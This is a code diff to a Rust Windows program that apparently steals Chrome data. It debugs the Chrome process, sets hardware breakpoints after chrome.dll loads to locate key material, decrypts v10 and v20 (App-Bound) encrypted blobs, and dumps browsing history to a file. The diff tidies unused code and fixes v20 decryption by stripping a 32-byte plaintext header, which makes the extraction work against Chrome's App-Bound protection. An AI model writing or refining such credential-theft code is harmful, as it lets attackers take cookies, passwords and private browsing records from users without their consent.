@@ -3,9 +3,6 @@
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::System::Diagnostics::Debug::*;
-use windows_sys::Win32::System::Memory::*;
-use windows_sys::Win32::System::LibraryLoader::*;
-use windows_sys::Win32::System::ProcessStatus::*;
 use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::Security::*;
 use windows_sys::Win32::Security::Cryptography::*;
@@ -17,7 +14,7 @@ use std::fs;
 use std::io::Write;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::{Connection};
-use chrono::{DateTime, Utc};
+use chrono::{Utc};
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
@@ -304,7 +301,7 @@ fn main() {
 
 unsafe fn debug_loop(h_process: HANDLE) {
     let mut debug_event: DEBUG_EVENT = zeroed();
-    let mut chrome_dll_base: *mut std::ffi::c_void = null_mut();
+    let mut _chrome_dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
 
     loop {
@@ -321,8 +318,8 @@ unsafe fn debug_loop(h_process: HANDLE) {
                     let path = String::from_utf16_lossy(&buffer[..len as usize]);
                     if path.contains("chrome.dll") {
                         println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
-                        chrome_dll_base = load_dll.lpBaseOfDll;
-                        target_address = find_target_address(h_process, chrome_dll_base);
+                        _chrome_dll_base = load_dll.lpBaseOfDll;
+                        target_address = find_target_address(h_process, _chrome_dll_base);
                         if target_address != 0 {
                             let threads = get_all_threads(debug_event.dwProcessId);
                             println!("Setting hardware breakpoints on {} threads", threads.len());
@@ -612,7 +609,13 @@ fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<
     } else if blob.starts_with(b"v20") && blob.len() > 15 {
         if let Some(cipher) = v20_cipher {
             let nonce = Nonce::from_slice(&blob[3..15]);
-            return cipher.decrypt(nonce, &blob[15..]).ok();
+            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
+                if dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
+                return Some(dec);
+            }
         }
     } else if blob.len() > 15 {
         // Fallback for some older versions or specific data types that might not have the prefix but use DPAPI directly
@@ -752,9 +755,9 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
 
             for row in rows.flatten() {
-                let (url, title, count, time) = row;
+                let (url, title, count, _time) = row;
                 // Webkit epoch to UTC
-                let dt = Utc::now(); // Placeholder for simplicity
+                let _dt = Utc::now(); // Placeholder for simplicity
                 writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
             }
         }
